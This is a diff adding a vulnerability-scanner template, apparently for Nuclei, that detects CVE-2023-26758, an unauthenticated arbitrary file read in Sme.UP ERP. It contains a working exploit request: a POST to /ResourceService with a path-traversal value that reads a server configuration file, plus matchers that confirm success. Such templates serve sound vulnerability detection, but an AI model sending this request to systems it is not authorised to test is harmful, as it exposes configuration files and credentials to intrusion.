@@ -1,0 +1,35 @@
+id: cve-2023-26758
+info:
+  name: Sme.UP ERP ResourceService File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Sme.UP ERP version TOKYO V6R1M220406 has an arbitrary file reading vulnerability under the /ResourceService route.
+    Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), resulting in an extremely insecure state of the website.
+  tags: file-read
+  reference:
+    - https://www.swascan.com/it/security-advisory-sme-up-erp/
+    - https://www.smeup.com/
+  classification:
+    cve-id: CVE-2023-26758
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+variables:
+  filePath: "../serviceNT/conf/wrapper.conf"
+http:
+  - raw:
+      - |
+        POST /ResourceService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        customer={{filePath}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "wrapper.java."
+        part: body
